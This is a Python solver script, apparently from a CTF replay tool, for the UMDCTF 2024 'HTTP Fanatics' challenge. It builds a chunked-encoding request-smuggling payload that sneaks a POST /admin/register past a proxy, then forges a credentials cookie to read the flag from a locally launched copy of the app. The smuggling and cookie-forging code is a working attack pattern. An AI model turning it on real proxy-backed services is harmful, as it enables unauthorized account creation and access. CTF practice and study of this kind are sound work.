#!/usr/bin/env python3
"""Replay UMDCTF 2024 HTTP Fanatics as a local request-smuggling proof.

This helper is for local or explicitly authorized CTF challenge artifacts. The
challenge proxy rejects direct HTTP/3 `/admin/register` requests, but forwards a
PUT request to the FastAPI backend without removing `Transfer-Encoding:
chunked`. A zero-length chunk followed by a second HTTP/1.1 request registers a
user on the backend; a matching credentials cookie then opens the dashboard.
"""

from __future__ import annotations

import argparse
import base64
import json
import re
import shutil
import socket
import subprocess
import sys
import tempfile
import time
import urllib.request
from pathlib import Path


FLAG_RE = re.compile(r"(?i)(?:UMDCTF|flag|ctf)\{[^{}\r\n]{3,300}\}")
PLACEHOLDER_MARKERS = ("TEST_FLAG", "FLAG_FOR_TESTING", "DUMMY", "PLACEHOLDER")


def build_registration_json(username: str, password: str) -> bytes:
    return json.dumps({"username": username, "password": password}, separators=(",", ":")).encode()


def build_smuggled_h1_request(username: str, password: str) -> bytes:
    registration = build_registration_json(username, password)
    smuggled = (
        b"0\r\n\r\n"
        b"POST /admin/register HTTP/1.1\r\n"
        b"Host: app:80\r\n"
        + f"Content-Length: {len(registration)}\r\n".encode()
        + b"Content-Type: application/json\r\n"
        b"\r\n"
        + registration
    )
    return (
        b"PUT /put HTTP/1.1\r\n"
        b"host: app:80\r\n"
        b"transfer-encoding: chunked\r\n"
        b"\r\n"
        + smuggled
    )


def build_credentials_cookie(username: str, password: str) -> str:
    encoded = base64.b64encode(json.dumps({"username": username, "password": password}, separators=(",", ":")).encode())
    return "credentials=" + encoded.decode()


def extract_flags(text: str) -> list[str]:
    flags: list[str] = []
    for match in FLAG_RE.finditer(text):
        candidate = match.group(0)
        if any(marker in candidate.upper() for marker in PLACEHOLDER_MARKERS):
            continue
        if candidate not in flags:
            flags.append(candidate)
    return flags


def free_local_port() -> int:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.bind(("127.0.0.1", 0))
        return int(sock.getsockname()[1])


def solve_app_dir(app_dir: Path, timeout: float = 180.0, venv_dir: Path | None = None) -> str:
    main_py = app_dir / "main.py"
    if not main_py.exists():
        raise FileNotFoundError(f"missing FastAPI source: {main_py}")
    venv_dir = (venv_dir or Path(".forgeflag/replay-venvs/http-fanatics")).resolve()
    python = ensure_venv(app_dir, venv_dir, timeout=timeout)
    port = free_local_port()
    username = "bob"
    password = "bob2"
    with tempfile.TemporaryDirectory(prefix="forgeflag-http-fanatics-") as tmp:
        workdir = Path(tmp) / "app"
        shutil.copytree(app_dir, workdir, ignore=shutil.ignore_patterns("__pycache__"))
        proc = subprocess.Popen(
            [str(python), "-m", "uvicorn", "main:app", "--host", "127.0.0.1", "--port", str(port)],
            cwd=workdir,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
        )
        try:
            wait_for_port(port, timeout=timeout)
            smuggle_transcript = send_smuggled_request(port, build_smuggled_h1_request(username, password), timeout=timeout)
            dashboard = fetch_dashboard(port, build_credentials_cookie(username, password), timeout=timeout)
        finally:
            proc.terminate()
            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait(timeout=5)

    flags = extract_flags(dashboard)
    if not flags:
        raise RuntimeError(f"no non-placeholder flag found; smuggle={smuggle_transcript[-200:]!r} dashboard={dashboard[-400:]!r}")
    print("challenge: HTTP Fanatics")
    print("artifact: source main.py and reverse-proxy main.rs")
    print("source_proxy_bug: HTTP/3 request keeps transfer-encoding when converted to HTTP/1.1")
    print("smuggled_method: POST /admin/register")
    print("method: zero-length chunk ends the visible PUT body and smuggles backend registration")
    print(f"flag: {flags[0]}")
    return flags[0]


def ensure_venv(app_dir: Path, venv_dir: Path, timeout: float) -> Path:
    python = venv_dir / "bin" / "python"
    marker = venv_dir / ".forgeflag-http-fanatics-ready"
    if marker.exists() and python.exists():
        return python
    venv_dir.parent.mkdir(parents=True, exist_ok=True)
    subprocess.run([sys.executable, "-m", "venv", str(venv_dir)], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, timeout=timeout, check=True)
    subprocess.run(
        [str(venv_dir / "bin" / "pip"), "install", "-r", str(app_dir / "requirements.txt")],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        timeout=timeout,
        check=True,
    )
    marker.write_text("ready\n", encoding="utf-8")
    return python


def wait_for_port(port: int, timeout: float) -> None:
    deadline = time.monotonic() + timeout
    last_error: Exception | None = None
    while time.monotonic() < deadline:
        try:
            with socket.create_connection(("127.0.0.1", port), timeout=1.0):
                return
        except Exception as exc:
            last_error = exc
            time.sleep(0.25)
    raise TimeoutError(f"uvicorn did not listen before timeout: {last_error}")


def send_smuggled_request(port: int, payload: bytes, timeout: float) -> str:
    with socket.create_connection(("127.0.0.1", port), timeout=timeout) as sock:
        sock.settimeout(1.0)
        sock.sendall(payload)
        chunks: list[bytes] = []
        deadline = time.monotonic() + 3.0
        while time.monotonic() < deadline:
            try:
                chunk = sock.recv(4096)
            except TimeoutError:
                break
            if not chunk:
                break
            chunks.append(chunk)
        return b"".join(chunks).decode("utf-8", errors="replace")


def fetch_dashboard(port: int, cookie: str, timeout: float) -> str:
    request = urllib.request.Request(f"http://127.0.0.1:{port}/dashboard", headers={"Cookie": cookie})
    with urllib.request.urlopen(request, timeout=min(timeout, 10.0)) as response:
        return response.read().decode("utf-8", errors="replace")


def main() -> int:
    parser = argparse.ArgumentParser(description="Replay UMDCTF HTTP Fanatics from local CTF source artifacts.")
    parser.add_argument("--app-dir", type=Path, required=True, help="directory containing main.py and requirements.txt")
    parser.add_argument("--timeout", type=float, default=180.0)
    parser.add_argument("--venv-dir", type=Path, help="persistent Python venv for local replay dependencies")
    args = parser.parse_args()
    try:
        solve_app_dir(args.app_dir.resolve(), timeout=args.timeout, venv_dir=args.venv_dir)
    except Exception as exc:
        print(f"[!] {exc}", file=sys.stderr)
        return 1
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
